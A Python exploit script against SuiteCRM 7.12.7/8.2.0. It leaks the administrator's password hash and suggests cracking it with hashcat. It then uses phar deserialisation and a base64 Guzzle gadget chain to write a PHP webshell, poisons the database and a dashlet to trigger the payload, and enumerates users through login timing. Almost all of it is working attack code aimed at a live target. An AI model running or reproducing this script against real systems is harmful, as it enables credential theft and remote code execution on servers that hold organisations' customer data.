import requests
import argparse
import re
import base64
import time
import warnings

warnings.filterwarnings("ignore")

### Image containing exploit, do not change :D
phar_jpeg = b"""

"""[1:-1]
ExploitName = 'SugarEXP.jpg'
SERIAL_PAYLOAD = b'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6Mjc6Ii92YXIvd3d3L2h0bWwvcmFuZG9tX3dzLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7TzoyNzoiR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llIjoxOntzOjMzOiIAR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llAGRhdGEiO2E6Mzp7czo3OiJFeHBpcmVzIjtpOjE7czo3OiJEaXNjYXJkIjtiOjA7czo1OiJWYWx1ZSI7czoxODoiPD89IGAkX0dFVFswXWA7Pz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQo='


### Fake account for poisonning
NameAccount = "DENSON Robbert"
EmailAccount = "rdenson@apple.com"

### URL For exploit
URLs = {
	'login'	:	'',
	'Logout'	:	'?module=Users&action=Logout',
	'LeakAdminPass'	:	'?action=getEditFieldHTML&module=Home&field=user_hash&id=1&current_module=Users',
	'LeakAdminName'	:	'?action=getEditFieldHTML&module=Home&field=user_name&id=1&current_module=Users',
	'isAdmin'	:	'?module=Administration',
	'ListAOSProducts'	:	'?module=AOS_Products&action=ListView',
	'Unserialize'	:	'?module=Administration&action=UpgradeWizard&view=module&run=upload&load_module_from_dir=phAr://upload&upgrade_zip_escaped=',
	'DashletAdd'	:	'?module=Home&action=DynamicAction&DynamicAction=addDashlet&activeTab=0&id=RSSDashlet&to_pdf=1',
	'DashletView'	:	'?action=DynamicAction&DynamicAction=displayDashlet&session_commit=1&id=',
	'DashletDel'	:	'?action=DynamicAction&DynamicAction=deleteDashlet&session_commit=1&id=',
	'Index'	:	'?module=Home&action=index',
	'CampaignView'	:	'?module=Campaigns&action=index&parentTab=All',
	'PolluteDb'	:	'?entryPoint=WebToPersonCapture&moduleDir=SavedSearch&assigned_user_id=1'
}

REGEXs = {
	'LoginUser'	:	r'<span class="globallabel-user">(.*?)</span>',
	'AdminVal'	:	r"value='(.*?)' title=''.*DOCTYPE",
	'ImgLoc'	:	rf'<img src="(.*?{ExploitName})"/><',
	'UserId'	:	r'<a href=\'index.php\?module=Users&action=EditView&record=(.*?)\'>',
	'CampaignId'	:	r''
}

### Color
N = "\x1b[0m"
R = "\x1b[91m"
G = "\x1b[92m"
Y = "\x1b[93m"
B = "\x1b[94m"

### Simple print
msg = lambda x="",y="\n": print(f"{G}[+]{N} {x}", end=y)
log = lambda x="",y="\n": print(f"{Y}[!]{N} {x}", end=y)
err = lambda x="",y="\n": print(f"{R}[x]{N} {x}", end=y)

def head():
	print("""
  /$$$$$$            /$$   /$$                /$$$$$$  /$$$$$$$  /$$      /$$
 /$$__  $$          |__/  | $$               /$$__  $$| $$__  $$| $$$    /$$$
| $$  \\__/ /$$   /$$ /$$ /$$$$$$    /$$$$$$ | $$  \\__/| $$  \\ $$| $$$$  /$$$$
|  $$$$$$ | $$  | $$| $$|_  $$_/   /$$__  $$| $$      | $$$$$$$/| $$ $$/$$ $$
 \\____  $$| $$  | $$| $$  | $$    | $$$$$$$$| $$      | $$__  $$| $$  $$$| $$
 /$$  \\ $$| $$  | $$| $$  | $$ /$$| $$_____/| $$    $$| $$  \\ $$| $$\\  $ | $$
|  $$$$$$/|  $$$$$$/| $$  |  $$$$/|  $$$$$$$|  $$$$$$/| $$  | $$| $$ \\/  | $$
 \\______/  \\______/ |__/   \\___/   \\_______/ \\______/ |__/  |__/|__/     |__/
		""")
	print(" "*43 + f"(Tested on version 7.12.7 / 8.2.0)")
	print(" "*70 + f"@jrjgjk")
	print()

def parse_url_input(url):
	log(f'If you want to attack the version 8.2.0 or < 8.2.0 the url should probably looks like {R}http://suite.crm.site/legacy/index.php{N}')
	if(url[0:4] != 'http'):
		err(f'Missing http in url: {url}')
		exit(0)
	if('index.php' not in url):
		url += '/index.php'

	return url

def login(url, user, password, s):
	login_data = {
		"module":"Users",
		"action":"Authenticate",
		"return_module":"Users",
		"return_action":"Login",
		"cant_login":"",
		"login_module":"",
		"login_action":"",
		"login_record":"",
		"login_token":"",
		"login_oauth_token":"",
		"login_mobile":"",
		"user_name":user,
		"username_password":password,
		"Login":"Log+In"
		}
	res = s.post(URL, data=login_data, verify=False)
	matches = re.findall(REGEXs['LoginUser'], res.text)
	if ((matches != [] and matches[0].lower() == user) or ('SUITECRM DASHBOARD' in res.text)): # 'SUITECRM DASHBOARD' is here for compatibility with latest version
		msg(f"User: {B}{user}{N} logged in !")
		return True

	else:
		err(f"Log in Failed !!")
		return False

def isadmin(url, s):
	if("Unauthorized access" in s.get(url + URLs['isAdmin'], verify=False).text):
		return False
	else:
		return True

def recover(url, s):
	res_login = s.get(url + URLs['LeakAdminName'], verify=False)
	res_pass = s.get(url + URLs['LeakAdminPass'], verify=False)
	username = re.findall(REGEXs['AdminVal'], res_login.text)
	password = re.findall(REGEXs['AdminVal'], res_pass.text)
	return username[0], password[0].replace('\\','')

def recover_img(img_payload):
	raw_img = base64.b64decode(img_payload)
	emplacement = input(f"Enter full path to write the {R}payload{N} (Ex: {Y}/var/www/html/ws.php{N}, default: '/proc/self/cwd/random_ws.php')>>> ")
	if(emplacement == ''):
		emplacement = '/proc/self/cwd/random_ws.php'
	filename = emplacement.split('/')[-1]
	emplacement_serialized = f's:{len(emplacement)}:"{emplacement}"'.encode()
	log(f"Creating fake image, payload: {Y}{emplacement}{N}")
	raw_img = raw_img.replace(b's:27:"/var/www/html/random_ws.php"', emplacement_serialized)
	return raw_img, filename

def do_upload(url, s, img):
	upload_data = {
		"module" : "AOS_Products",
		"record" : "",
		"action" : "Save",
		"return_module" : "AOS_Products",
		"return_action" : "DetailView",
		"offset" : "1",
		"name" : "ExploitSugarCRM",
		"type" : "Good",
		"currency_id" : "-99",
		"price" : "-5",
		"deleteAttachment" : "0"
	}
	res = s.post(url, headers=referer, files={"uploadimage":(ExploitName, img)}, data=upload_data, allow_redirects=True, verify=False)
	img_loc = re.findall(REGEXs['ImgLoc'], res.text)
	if(len(img_loc) > 0):
		msg(f'Upload succeed')
		msg(f'Img location: {img_loc[0]}')
		return img_loc[0]

	err(f'Upload failed, maybe referer has not been set or the target is not at the good version..')
	return False

def upload_payload(url, img, s):
	shall_upload = input(f"Do you want to upload a fake image and try deserialisation ?(y/n) ")
	if(shall_upload.upper() == 'Y'):
		my_img, filename = recover_img(img)
		log(f"Staring upload..")
		res_upload = do_upload(URL, s, my_img)
		if(res_upload == False):
			return False, False

		malicious_link = url + URLs['Unserialize'] + res_upload.split('/')[-1]
		return malicious_link, filename
	
	return False, False

def login_time(url, user, password):
	login_data = {
		"module":"Users",
		"action":"Authenticate",
		"return_module":"Users",
		"return_action":"Login",
		"cant_login":"",
		"login_module":"",
		"login_action":"",
		"login_record":"",
		"login_token":"",
		"login_oauth_token":"",
		"login_mobile":"",
		"user_name":user,
		"username_password":password,
		"Login":"Log+In"
		}
	s = requests.Session()
	s.get(url)

	moy = 0
	for i in range(4):
		a = time.time()
		res = s.post(URL, data=login_data, verify=False)
		b = time.time()
		moy += b-a
	moy = moy / 4

	return moy

def poison_admin_user(url, s, malicious_link):
	poison_data = {
	  "module": "Accounts",
	  "record": "",
	  "isDuplicate": "false",
	  "action": "Save",
	  "return_module": "Accounts",
	  "return_action": "index",
	  "return_id": "",
	  "module_tab": "",
	  "contact_role": "",
	  "relate_to": "Accounts",
	  "relate_id": "",
	  "offset": "1",
	  "name": NameAccount,
	  "phone_office": "",
	  "website": malicious_link,
	  "phone_fax": "",
	  "Accounts_email_widget_id": "0",
	  "emailAddressWidget": "1",
	  "Accounts0emailAddress0": EmailAccount,
	  "Accounts0emailAddressId0": "",
	  "Accounts0emailAddressVerifiedFlag": "true",
	  "Accounts0emailAddressVerifiedEmailValue": "true",
	  "Accounts0emailAddressPrimaryFlag": "Accounts0emailAddress0",
	  "useEmailWidget": "true",
	  "billing_address_street": "",
	  "billing_address_city": "",
	  "billing_address_state": "",
	  "billing_address_postalcode": "",
	  "billing_address_country": "",
	  "shipping_address_street": "",
	  "shipping_address_city": "",
	  "shipping_address_state": "",
	  "shipping_address_postalcode": "",
	  "shipping_address_country": "",
	  "description": "",
	  "assigned_user_name": "",
	  "assigned_user_id": "1",
	  "account_type": "",
	  "industry": "",
	  "annual_revenue": "",
	  "employees": "",
	  "parent_name": "",
	  "parent_id": "",
	  "campaign_name": "",
	  "campaign_id": ""
	}
	s.post(url, data=poison_data, headers=referer, verify=False)
	log(f'Fake account with payload shall now be assigned to the user with id {R}1{N}')

def add_dashlet(url, s, malicious_link):
	exploit_data = {
		'type'	:	'web',
		'type_module'	:	malicious_link
	}
	res = s.post(url + URLs['DashletAdd'], data=exploit_data, verify=False, allow_redirects=False)
	return res.text

def view_dashlet(url, s, dashlet_link):
	s.get(url + URLs['DashletView'] + dashlet_link, verify=False)

def get_user_id(url, s):
	res = s.get(url + URLs['Index'], verify=False)
	Id = re.findall(REGEXs['UserId'], res.text)
	if(len(Id) > 0):
		return Id[0]
	elif(len(Id) == 0):
		resp = s.get(url + '?module=Users', verify=False, allow_redirects=False)
		Id = resp.headers['Location'].split('=')[-1] # For version 8.2.0
		return Id
	else:
		return False

def create_campaign(url, s, user_id, user_name, CAMPAIGN_NAME="EXPLOIT"):
	campaign_data = {
	  "module": "Campaigns",
	  "record": "",
	  "action": "WizardNewsletterSave",
	  "return_module": "Campaigns",
	  "return_id": "",
	  "return_action": "index",
	  "campaign_type": "NewsLetter",
	  "totalsteps": "2",
	  "currentstep": "1",
	  "wiz_direction": "continue_targetList",
	  "wiz_step1_name": CAMPAIGN_NAME,
	  "wiz_step1_assigned_user_name": user_name,
	  "wiz_step1_assigned_user_id": user_id,
	  "wiz_step1_status": "Planning",
	  "wiz_step1_campaign_type": "NewsLetter",
	  "wiz_step1_content": "",
	  "wiz_step2_budget": "",
	  "wiz_step2_actual_cost": "",
	  "wiz_step2_expected_revenue": "",
	  "wiz_step2_expected_cost": "",
	  "wiz_step2_currency_id": "-99",
	  "wiz_step2_impressions": "0",
	  "wiz_step2_objective": "",
	  "wiz_subscriptions_def_type": "2",
	  "wiz_step3_subscription_name": "",
	  "prospect_list_type_default": "default",
	  "wiz_step3_subscription_list_id": "",
	  "wiz_unsubscriptions_def_type": "2",
	  "wiz_step3_unsubscription_name": "",
	  "prospect_list_type_exempt": "exempt",
	  "wiz_step3_unsubscription_list_id": "",
	  "wiz_test_def_type": "2",
	  "wiz_step3_test_name": "",
	  "prospect_list_type_test": "test"
	}
	s.post(url, data=campaign_data, verify=False)
	res = s.get(url + URLs['CampaignView'], verify=False)
	Id = re.findall(rf'record=(.*?)">\s*{CAMPAIGN_NAME}', res.text)
	if(len(Id) > 0):
		return Id[0]
	elif(len(Id) == 0):
		Id = re.findall(rf'/campaigns/record/(.*?)\?.*?">\s*{CAMPAIGN_NAME}', res.text) # For version 8.2.0
		print(Id)
		return Id[0]
	else:
		return False

def store_maliciouis_payload(url, s, campaign_id, user_id):
	pa = base64.b64decode(SERIAL_PAYLOAD)
	path = input(f'Enter path for webshell (default: /proc/self/cwd/random_ws.php): ')
	if(path == ''):
		path = "/proc/self/cwd/random_ws.php"
	new_path = f's:{len(path)}:"{path}"'
	exp_serialised = base64.b64encode(pa.replace(b's:27:"/var/www/html/random_ws.php"', new_path.encode()))
	
	pollute_object_data = {
		'campaign_id'	:	campaign_id,
		'assigned_user_id'	:	user_id,
		'contents'	:	exp_serialised,
		'description'	:	'EXPLOIT',
		'search_module'	:	'Employees',
		'name'	:	'JRJGJK'
	}
	s.post(url + URLs['PolluteDb'], data=pollute_object_data, verify=False)
	log('Db should have been pollute by now')
	return path.split('/')[-1]


if __name__ == '__main__':
	head()

	parser = argparse.ArgumentParser(description="Exploit authenticated Vulnerability on SuiteCRM")
	parser.add_argument('-u', '--username', help='Username to use')
	parser.add_argument('-p', '--password', help='Password to use')
	parser.add_argument('--rce-phar', action='store_true', help='Remote code execution via phar deserialisation')
	parser.add_argument('--url', help='Target url: http://suite.com/index.php for version 7, http://suite.com/legacy/index.php for version 8', required=True)
	parser.add_argument('--enum-users', help='Filename containing list of users', metavar='USERLIST')
	args = parser.parse_args()

	### Check args
	if (args.username == None and args.password == None and args.enum_users == None):
		parser.error('You should provide either -u USERNAME -p PASSWORD or --enum-users USERLIST')
	if(args.enum_users == None and (args.username == None or args.password == None)):
		parser.error('You should provide -u USERNAME and -p PASSWORD')

	URL = parse_url_input(args.url)
	if(args.enum_users != None):
		wl = args.enum_users

		with open(wl, 'r') as f:
			data = list(map(lambda x: x.strip(), f.readlines()))
		
		dont_exist = 'JKDLEJzoljkdfeqskhjEJKEHdkjnfdecz5654ezmlkde'
		PASSWORD = 'fake_password_123456'

		log('Enumerating users with time based method:')
		moy_dont_exist = login_time(URL, dont_exist, PASSWORD)
		log(f"User that doesn't exist: {moy_dont_exist} s")
		for u in data:
			moy = login_time(URL, u, PASSWORD)
			if(moy - 0.06 > moy_dont_exist):
				msg(f'User {u}: {moy} s probably \x1b[92mexists\x1b[0m')
			else:
				log(f'User {u}: {moy} s')
		exit(0)
			

	### REFERER if needed
	referer = {'Referer' : URL}
	user, password = args.username, args.password
	log(f"Attacking target: {URL}")
	log(f'Starting session..')

	s = requests.Session()
	s.get(URL, verify=False)
	is_login = login(URL, user, password, s)
	if not(is_login):
		exit(0)


	if(args.rce_phar):
		log('Exploiting phar deserialization')
		log(f"Checking Admin rights")
		if not(isadmin(URL, s)):
			log(f"{user} is not admin")
			log(f'Exploiting CVE and recovering administrator\'s informations')
			log(f'Default algo for password is {Y}bcryptmd5{N} \U0001F976 ')
			try:
				admin_user, admin_pass = recover(URL, s)
				msg(f"Successfully recovered Administrator username/password:")
				msg(f"username: {R}{admin_user}{N}")
				msg(f"password: {R}{admin_pass}{N}")
				log(f'hashcat -m 25600 -a 0 {B}HASH_FILE{N} {Y}WL{N}')

			except:
				err('Failed recovering admin name/password')
				exit(0)

			malicious_link, filename = upload_payload(URL, phar_jpeg, s)
			if(malicious_link != False):
				# poison_admin = input(f"You are not an admin, do you want to poison the real admin ?(y/n) ")
				# if(poison_admin.upper() == 'Y'):
				# 	log(f'Poisonning admin')
				# 	poison_admin_user(URL, s, malicious_link)
				# 	Link = URL[:-9] + filename + '?0=whoami'
				# 	log(f'Once admin has clicked on the link, go to: {Link}')
				
				PAYLOAD = 'phar://upload/' + malicious_link.split('=')[-1]
				log(f'Adding malicious web dashlet into database.. ({PAYLOAD})')
				dashlet_link = add_dashlet(URL, s, PAYLOAD)
				msg(f'Viewing dashlet to trigger exploit: Link --> {dashlet_link}')
				log(f'Checking if exploit worked..')
				view_dashlet(URL, s, dashlet_link)

				res = s.get(URL[:-9] + filename + '?0=whoami', verify=False)
				if(res.status_code == 200):
					msg('Exploit Worked !!!')
					print(res.text)
				else:
					err('Failed, target probably patch or php > 8.0')

				log('Trying to remove dashlet')
				s.get(URL + URLs['DashletDel'] + dashlet_link)

		else:
			msg(f"Whououhh {user} is admin !!")
			malicious_link, filename = upload_payload(URL, phar_jpeg, s)
			if(malicious_link != False):
				trigger_unserialize = input(f'You are admin, do you want to trigger deserialisation (if php<8.0) ?(y/n) ')
				if(trigger_unserialize.upper() == 'Y'):
					log(f'Triggering unserialize...')
					s.get(malicious_link, headers=referer, verify=False)
					res = s.get(URL[:-9] + filename + '?0=whoami', verify=False)
					if('"Expires":1,"Discard":false,"Value":' in res.text):
						msg(f'Exploit completed !! \U0001F600 ')
						whoami_cmd = res.text.split('"')
						whoami_res = whoami_cmd[-2].strip()
						msg(f"whoami >> {whoami_res}")

	else:
		log('Exploiting arbitrary unserialize !!')
		user_id = get_user_id(URL, s)
		if(user_id == False):
			err('Failed recovering user id...')
			exit(0)

		log(f'Creating campaign for user {user}')
		campaign_id = create_campaign(URL, s, user_id, user)
		if(campaign_id == False):
			err('Failed finding campaign id...')
			exit(0)

		log(f'Poisonning DB with serialized payload')
		payload_path = store_maliciouis_payload(URL, s, campaign_id, user_id)
		log(f'Trigger unserialize using the advanced search named JRJGJK in the Employees module (?module=Employees)')
		log(f'Once it is done go here: {URL[:-9] + payload_path}?0=whoami')
